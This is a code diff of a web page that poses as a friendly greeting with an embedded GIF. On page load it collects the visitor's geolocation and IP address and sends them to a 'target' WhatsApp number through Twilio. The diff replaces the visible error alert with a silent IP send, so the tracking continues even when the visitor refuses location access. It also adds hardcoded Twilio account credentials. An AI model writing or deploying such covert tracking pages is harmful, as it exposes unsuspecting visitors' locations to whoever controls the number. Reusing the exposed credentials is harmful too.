@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body onload="getLocation()">
-  <h1>HI THERE FRIEND</h1>
+<h1>HI THERE</h1>
 <iframe src="https://giphy.com/embed/NWg7M1VlT101W" width="480" height="269" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/disney-bored-tired-NWg7M1VlT101W"></a></p>
-
 <script>
 
 function getLocation() {
@@ -23,7 +22,7 @@ async function getIp(location) {
     const data = await response.json();
     const ip = data.ip;
     const position=location || 'Coords unavailable'
-    const ipLocation = "IP Address: " + ip + "<br>" + position;
+    const ipLocation = "IP Address: " + ip + "Coordinates: " + position;
     console.log(ipLocation);
     sendLocation(ipLocation);
   }catch(error){
@@ -41,13 +40,13 @@ function handleSuccess(position) {
 
 function handleError() {
   const errorMsg = "Sorry, no position available.";
-  alert(errorMsg);
+  getIp(errorMsg);
   console.error(errorMsg);
 }
 
 function sendLocation(message) {
-  const accountSid = 'ACa19fba622d6c5fe27c95c975015c1109';
-  const authToken = 'a3133adbba7e282cefd53311172df692';
+  const accountSid = 'ACbc8464afe1ed79c7fa05d24b822e7b58';
+  const authToken = '6c257fa627ae4339fa374c632cc337d2';
   const twilioNumber = 'whatsapp:+14155238886'; // Twilio sandbox number
   const recipientNumber = 'whatsapp:+254710745780'; // Your target number
 
